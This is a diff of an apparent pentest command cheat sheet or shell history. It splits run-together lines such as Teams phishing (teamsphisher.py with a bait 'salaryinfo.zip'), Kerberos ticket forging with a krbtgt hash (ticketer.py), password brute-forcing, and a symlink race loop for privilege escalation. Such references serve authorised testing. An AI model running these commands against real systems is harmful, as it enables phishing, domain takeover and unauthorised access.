@@ -2861,12 +2861,14 @@ tasklist /SVC
 tasklist /SVC #links processes to started services
 tasklist /V
 tasklist /V #List processes
-tcpdump -i eth0 -w capture.pcapteamsphisher.py -u admin@example.com -p password -l ./targets.txt -a ./salaryinfo.zip -m ./message.txt --log --personalizetestdisk image.dd
+tcpdump -i eth0 -w capture.pcap
+teamsphisher.py -u admin@example.com -p password -l ./targets.txt -a ./salaryinfo.zip -m ./message.txt --log --personalize
+testdisk image.dd
 telnet <ip>
 telnet <ip> 
 telnet root@<ip> 
 Test-WSMan -computername <computername>
-testssl --connect-timeout 15 --openssl-timeout 30 --log -p -iL ../httpx_tls.txt| tee testssl.txt
+testssl --connect-timeout 15 --openssl-timeout 30 --log -p -iL <cible.txt> | tee testssl.txt
 testssl --help
 testssl --log -p --help
 testssl --log -p -iL ../httpx_tls.txt| tee testssl.txt
@@ -2886,7 +2888,8 @@ ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomu
 ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
 ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
 ticketer.py -request -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'
-timing_attack -u $TARGET --parameters '{"password":"INPUT"}' --brute-forcetls-map search gnutls RSA_ARCFOUR_128_SHA1 --output iana
+timing_attack -u $TARGET --parameters '{"password":"INPUT"}' --brute-force
+tls-map search gnutls RSA_ARCFOUR_128_SHA1 --output iana
 tldr 7z
 tldr du
 tldr find
@@ -3001,7 +3004,6 @@ whatweb -i c -a 3 --follow-redirect always
 whatweb -i d -a 3 --follow-redirect always
 whatweb -i httpx.txt -a 3 --follow-redirect always --color auto | tee whatweb.txt
 whatweb -i httpx.txt -a 3 --follow-redirect always -v --color auto
-When the Windows operating system is running, the hives are in use and mounted. The command-line tool named reg can be used to export them.
 while true ; do N=<file_to_search> ; if [[ -r $N ]] ; then rm $N ; ln -s <symlink_target_file> $N ; break; fi ; done
 whoami /all
 whoami /all #All info about me, take a look at the enabled tokens
